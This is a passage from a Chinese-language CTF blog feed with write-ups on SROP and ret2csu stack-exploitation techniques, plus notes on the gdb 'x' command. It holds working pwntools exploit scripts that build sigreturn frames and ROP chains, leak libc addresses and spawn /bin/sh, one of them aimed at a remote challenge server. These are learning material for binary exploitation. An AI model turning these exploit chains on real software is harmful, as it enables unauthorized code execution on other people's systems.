class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> binsh </pre></td></tr><tr><td data-num=\"53\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall</pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>pl2 <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\x00'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sigreturn<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>sigframe<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'传输sigframe之前======>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'传输sigframe之后======>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"65\"></td><td><pre>需要设置架构</pre></td></tr><tr><td data-num=\"66\"></td><td><pre>execve:</pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\tsigframe = SigreturnFrame()</pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\tsigframe.rax = constants.SYS_execve</pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\tsigframe.rdi = binsh </pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\tsigframe.rsi = 0x0</pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\tsigframe.rip = syscall</pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>read:</pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\tframe =  SigreturnFrame()</pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\tframe.rax = constants.SYS_read</pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\tframe.rdi = 0</pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\tframe.rsi = stack_addr</pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\tframe.rdx = 0x400</pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\tframe.rsp = stack_addr</pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\tframe.rip = syscall_addr</pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>x64 more information:</pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\thttp://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>sigframe <span class=\"token operator\">=</span> SigreturnFrame<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rax <span class=\"token operator\">=</span> constants<span class=\"token punctuation\">.</span>SYS_execve</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> binsh </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>pl2 <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\x00'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sigreturn<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>sigfram）</pre></td></tr></table></figure><p>当传入 pl2 我们调试发现寄存器的变化</p>\n<p>可见 srop 的攻击原理</p>\n<p><img data-src=\"/img/srop/image-20230803224211151.png\" alt=\"\"></p>\n<p><img data-src=\"/img/srop/image-20230803224917202.png\" alt=\"image-20230803224917202\"></p>\n<p><img data-src=\"/img/srop/image-20230803224304825.png\" alt=\"image-20230803224304825\"></p>\n",
            "tags": [
                "rop",
                "srop"
            ]
        },
        {
            "id": "http://example.com/2023/08/03/csu/",
            "url": "http://example.com/2023/08/03/csu/",
            "title": "csu",
            "date_published": "2023-08-03T11:47:18.000Z",
            "content_html": "<h1 id=\"中级rop_csu\"><a class=\"markdownIt-Anchor\" href=\"#中级rop_csu\">#</a> 中级 ROP_CSU</h1>\n<p><strong>ret2csu</strong> 泄露 libc 地址之后利用 libc 中的 gadget getshell. <strong>ret2csu</strong> 配合 pop rax; syscall; 等 gadget 直接 GetShell. 开启 PIE 的情况下，利用 offset2lib 进行<strong> ret2csu</strong>, 或者直接利用 libc 中的 gadget getshell.</p>\n<p>只要动态连接都会有 _libc_csu_init 函数</p>\n<h3 id=\"原理\"><a class=\"markdownIt-Anchor\" href=\"#原理\">#</a> 原理 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9tZWRpdW0tcm9wLyNfMQ==\">¶</span></h3>\n<p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别)</p>\n<p>gadget1_先执行</p>\n<ul>\n<li>从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。</li>\n</ul>\n<pre><code class=\"language-Python\">.text:000000000040061A                 pop     rbx\n.text:000000000040061B                 pop     rbp\n.text:000000000040061C                 pop     r12\n.text:000000000040061E                 pop     r13\n.text:0000000000400620                 pop     r14\n.text:0000000000400622                 pop     r15\n.text:0000000000400624                 retn\n.text:0000000000400624 __libc_csu_init endp\n</code></pre>\n<p>我们通常会把 rbx 的值设置成 0，而 rbp 设置成 1. 这样的目的是在执行 call qword ptr [r12+rbx*8] 这个指令的时候，我们仅仅把 r12 的值给设置成指向我们想 call 地址的地址即可，从而不用管 rbx。</p>\n<p>又因为这三个指令 add rbx,；cmp rbx, rbp；jnz short loc_400600，jnz 是不相等时跳转，我们通常并不想跳转到 0x400580 这个地方，因为此刻执行这三个指令的时候，我们就是从 0x400600 这个地址过来的。因此 rbx 加一之后，我们要让它和 rbp 相等，因此 rbp 就要提前被设置成 1.</p>\n<p>然后<strong> r12 要存放的就是指向（我们要跳转到那个地址）的地址</strong>。这里有个很重要的小技巧，如果你不想使用这个 call，或者说你想 call 一个函数，但是你拿不到它的 got 地址，因此没法使用这个 call，那就去 call 一个空函数（_term_proc 函数）（并且要注意的是，r12 的地址填写的并不是_term_proc 的地址，而是指向这个函数的地址）。</p>\n<p>然后 r13,r14,r15 这三个值分别对应了 rdx,rsi,edi。这里要注意的是，r15 最后传给的是 edi, 最后 rdi 的高四字节都是 00，而低四字节才是 r15 里的内容。（也就是说如果想用 ret2csu 去把 rdi 里存放成一个地址是不可行的）</p>\n<p>gadget2_后执行</p>\n<ul>\n<li>从 0x0000000000400600 到 0x0000000000400609，我们可以将 r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0（自行调试）</strong>，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。</li>\n</ul>\n<p>此时开始执行这部分代码，这没什么好说的了，就是把 r13,r14,r15 的值放入 rdx,rsi,edi 三个寄存器里面。</p>\n<p>然后由于我们前面的 rbx 是 0，加一之后等于了 rbp，因此 jnz 不跳转。那就继续向下执行，如果我们上面 call 了一个空函数的话，那我们就利用下面的 ret。由于继续向下执行，因此又来到了 gadget1 这里。</p>\n<p>如果不需要再一次控制参数的话，那我们此时把栈中的数据填充 56（7*8 你懂得）个垃圾数据即可。</p>\n<p>如果我们还需要继续控制参数的话，那就此时不填充垃圾数据，继续去控制参数，总之不管干啥呢，这里都要凑齐 56 字节的数据，以便我们执行最后的 ret，最后 ret 去执行我们想要执行的函数即可。</p>\n<pre><code class=\"language-Python\">.text:0000000000400600                 mov     rdx, r13\n.text:0000000000400603                 mov     rsi, r14\n.text:0000000000400606                 mov     edi, r15d\n.text:0000000000400609                 call    qword ptr [r12+rbx*8]\n</code></pre>\n<ul>\n<li>从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 = rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。</li>\n</ul>\n<pre><code class=\"language-Python\">.text:000000000040060D                 add     rbx, 1\n.text:0000000000400611                 cmp     rbx, rbp\n.text:0000000000400614                 jnz     short loc_400600\n</code></pre>\n<p>做一个稍微简单一点的 ret2libc 题目：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3RmZXIudmlwL3Byb2JsZW0vMjk2Mw==\">题目链接：ret2csu</span></p>\n<p><img data-src=\"/img/csu/1280X1280.PNG\" alt=\"img\"></p>\n<p><img data-src=\"/img/csu/1.PNG\" alt=\"img\"></p>\n<p>可以看出，和别的题没什么特别之处。</p>\n<p><img data-src=\"/img/csu/2.PNG\" alt=\"img\"></p>\n<p><img data-src=\"/img/csu/3.PNG\" alt=\"img\"></p>\n<p>很明显能够看出在 vuln 处的 read 函数有栈溢出漏洞。pad 为 0x100+8 找一下有没有后门（题目给出 libc 文件，那么一般都是没有后门的）</p>\n<p><img data-src=\"/img/csu/9fb1273e-c627-4f55-9543-5703e4616f76.png\" alt=\"img\"></p>\n<p>没有 system 调用，那么我们需要去单独泄露函数的真实地址，去计算 system 地址。我们可以用 ROPgadget 去看一下我们能不能用基本的 ROP 链去泄露地址，这里我们可以泄露 write 函数的真实地址或 read 函数的真实地址。</p>\n<pre><code class=\"language-Python\">0x00000000004012ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n</code></pre>\n<p>本身想用这个 gadget 去获取真实地址但是</p>\n<pre><code class=\"language-Python\">payload = pad + p64(pop_chain) + p64(1) + p64(write_got) + p64(8) + p64(0) + p64(write_plt) + p64(main_addr)\n</code></pre>\n<p>上面构造的 payload 并不能得到地址</p>\n<p>所以老老实实的去用 csu 去做这个题吧。</p>\n<p><img data-src=\"/img/csu/9812e1fa-bbb4-409c-b30b-04675e83af54.png\" alt=\"img\"></p>\n<p>gadget_1 = 0x4012AA</p>\n<p>gadget_2 = 0x401290</p>\n<p>但是这里有趣的是跳转的地址是用 r15+rbx*8 所以只需要注意的一点 r15 附到我们想跳转到地址就行。</p>\n<pre><code class=\"language-Python\">payload = pad \npayload += p64(gadget_1)\npayload += p64(0) # rbx\npayload += p64(1) # rbp\npayload += p64(1) # r12\npayload += p64(write_got) # r13\npayload += p64(8) # r14\npayload += p64(write_got) # r15\npayload += p64(gadget_2)\npayload += b'a'*(0x8+8*6)\npayload += p64(main_addr)\nfrom pwn import *\ncontext.log_level = 'debug'\ndebug = 0\nif debug :\n        p = process('ret2csu')\nelse:\n        p = remote('node1.anna.nssctf.cn',28119)\n\nelf = ELF('ret2csu')\n\ngadget_1 = 0x4012AA\ngadget_2 = 0x401290\nwrite_got = elf.got['write']\nwrite_plt = elf.plt['write']\nprint(hex(write_got))\nmain_addr = elf.symbols['main']\nprint(hex(main_addr))\npop_rdi = 0x04012b3\n# pop_chain = 0x00000000004012ac\nret = 0x040101a \npad = b'a'*(0x100 + 0x8)\npayload = pad \npayload += p64(gadget_1)\npayload += p64(0) # rbx\npayload += p64(1) # rbp\npayload += p64(1) # r12\npayload += p64(write_got) # r13\npayload += p64(8) # r14\npayload += p64(write_got) # r15\npayload += p64(gadget_2)\npayload += b'a'*(0x8+8*6)\npayload += p64(main_addr)\n\np.recvuntil('Input:\\n')\np.sendline(payload)\nwrite_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))\n\nlibc = ELF('libc.so.6')\nbase = write_addr - libc.sym['write']\nsys = base + libc.sym['system']\nbin_sh = list(libc.search(b'/bin/sh'))[0] + base\npayload1 = pad + p64(ret) +p64(pop_rdi) + p64(bin_sh) + p64(sys)\np.recvuntil('Input:\\n')\np.sendline(payload1)\n\np.interactive()\n</code></pre>\n<h3 id=\"插序-gdb-一些用法\"><a class=\"markdownIt-Anchor\" href=\"#插序-gdb-一些用法\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JyZWV6ZV9DQVQvYXJ0aWNsZS9kZXRhaWxzLzEwMzc4OTIzMw==\">插序 gdb 一些用法</span></h3>\n<h4 id=\"x命令\"><a class=\"markdownIt-Anchor\" href=\"#x命令\">#</a> X 命令：</h4>\n<p>可以使用 examine 命令 (简写是 x) 来查看内存地址中的值。x 命令的语法如下所示：</p>\n<p>x/&lt;n/f/u&gt;</p>\n<p><strong>n、f、u 是可选的参数。</strong></p>\n<p>n 是一个正整数，表示需要显示的内存单元的个数，也就是说从当前地址向后显示几个内存单元的内容，一个内存单元的大小由后面的 u 定义。</p>\n<p>f 表示显示的格式，参见下面。如果地址所指的是字符串，那么格式可以是 s，如果地十是指令地址，那么格式可以是 i。</p>\n<pre><code>x 按十六进制格式显示变量。\nd 按十进制格式显示变量。\nu 按十六进制格式显示无符号整型。\no 按八进制格式显示变量。\nt 按二进制格式显示变量。\na 按十六进制格式显示变量。\nc 按字符格式显示变量。\nf 按浮点数格式显示变量。\ns 按字符串显示。\nb 按字符显示。\ni 显示汇编指令。\n</code></pre>\n<p>u 表示从当前地址往后请求的字节数，如果不指定的话，GDB 默认是 4 个 bytes。u 参数可以用下面的字符来代替，b 表示单字节，h 表示双字节，w 表示四字 节，g 表示八字节。当我们指定了字节长度后，GDB 会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。</p>\n<p>x /10gx 0x123456 // 常用，从 0x123456 开始每个单元八个字节，十六进制显示是个单元的数据</p>\n<p>x /10xd $rdi // 从 rdi 指向的地址向后打印 10 个单元，每个单元 4 字节的十进制数</p>\n<p>x /10i 0x123456 // 常用，从 0x123456 处向后显示十条汇编指令</p>\n",
            "tags": [
                "csu",
                "rop",
                "gdb"
            ]
        }
    ]
}